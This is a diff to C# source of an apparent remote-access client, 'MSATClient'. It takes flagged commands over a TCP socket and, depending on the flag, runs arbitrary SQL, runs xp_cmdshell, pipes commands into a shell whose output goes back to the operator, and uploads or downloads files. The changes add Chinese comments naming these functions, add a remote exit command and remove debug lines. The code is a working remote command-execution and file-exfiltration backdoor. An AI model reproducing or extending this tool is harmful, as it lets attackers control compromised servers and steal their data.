@@ -1,12 +1,8 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Data;
 using System.Data.SqlClient;
-using System.Globalization;
 using System.IO;
-using System.Linq;
 using System.Net.Sockets;
-using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
@@ -118,15 +114,14 @@ namespace MSATClient
                         else
                             Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess.Substring(0, 35));**/
                     }
-                    if (firstFlag == '0')
+                    if (firstFlag == '0') //连接数据库
                     {
                         sqlConnect = SqlConnect(tcpSocket, sqlConnect, mess);
                     }
-                    else if (firstFlag == '2')
+                    else if (firstFlag == '2')  //sql查询
                     {
                         try
                         {
-                            //SqlCommand command = new SqlCommand(mess, conn);
                             SqlDataAdapter reader = new SqlDataAdapter(mess, sqlConnect);
                             DataSet dataSet = new DataSet();
                             reader.Fill(dataSet, "SQL");
@@ -182,7 +177,7 @@ namespace MSATClient
                         }
                         GC.Collect();
                     }
-                    else if (firstFlag == '3')
+                    else if (firstFlag == '3') //执行xp_cmdshell
                     {
                         if (!sqlStatus)
                         {
@@ -210,14 +205,14 @@ namespace MSATClient
                             }
                         }
                     }
-                    else if (firstFlag == '4')
+                    else if (firstFlag == '4') //CMD命令
                     {
                         p.StandardInput.WriteLine(mess);
                         if (mess.Contains("cd "))
                             p.StandardInput.WriteLine(" ");
                         p.StandardInput.AutoFlush = true;
                     }
-                    else if (firstFlag == '5')
+                    else if (firstFlag == '5') //服务端->客户端 传输文件
                     {
                         filePath = mess;
                         FileStream fsRead = new FileStream(filePath, FileMode.Open);
@@ -245,7 +240,7 @@ namespace MSATClient
                         Filebuffer = null;
                         GC.Collect();
                     }
-                    else if (firstFlag == '6')
+                    else if (firstFlag == '6') //客户端->服务端 传输文件
                     {
                         String filename = "";//Path.GetFileName(ClientFilePathTextEdit.Text);
                         String[] clientInfo = mess.Split(',');
@@ -277,27 +272,23 @@ namespace MSATClient
                         Filebuffer = null;
                         GC.Collect();
                     }
+                    else if (firstFlag == 'e')
+                    {
+                        System.Environment.Exit(System.Environment.ExitCode);
+                    }
                     mess = null;
 
                 }
                 catch (Exception ex)
                 {
                     tcpStatus = false;
-                    //Console.WriteLine("接收消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
-                    //Console.WriteLine("接收消息退出时的ClientStatus为：" + tcpStatus);
-                    //Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "本数据包为: " + getmess);
-                    //setTcpStatus(false);
-                    //p.WaitForExit();//等待程序执行完退出进程
-                    //p.StandardInput.WriteLine(" ");
                     p.Kill();
                     p = null;
                     GC.Collect();
                     break;
-                    //System.Environment.Exit(0);
                 }
                 GC.Collect();
             }
-            //Console.WriteLine("接收数据线程已关闭！！！");
         }
 
 
@@ -323,9 +314,6 @@ namespace MSATClient
                 }
                 catch (Exception ex)
                 {
-                    //Console.WriteLine("cmd正常命令-报错退出！EX:" + ex.Message);
-                    //p.Kill();
-                    //p = null;
                     GC.Collect();
                     break;
                 }
@@ -358,13 +346,10 @@ namespace MSATClient
                         }
                     }
                     if (result != "" && result != "\n")
-                        SendMess(tcpSocket, result, "4");
+                        SendMess(tcpSocket, result + '\n', "4");
                 }
                 catch (Exception ex)
                 {
-                    //Console.WriteLine("cmd命令报错-报错退出！EX:" + ex.Message);
-                    //p.Kill();
-                    //p = null;
                     GC.Collect();
                     break;
                 }
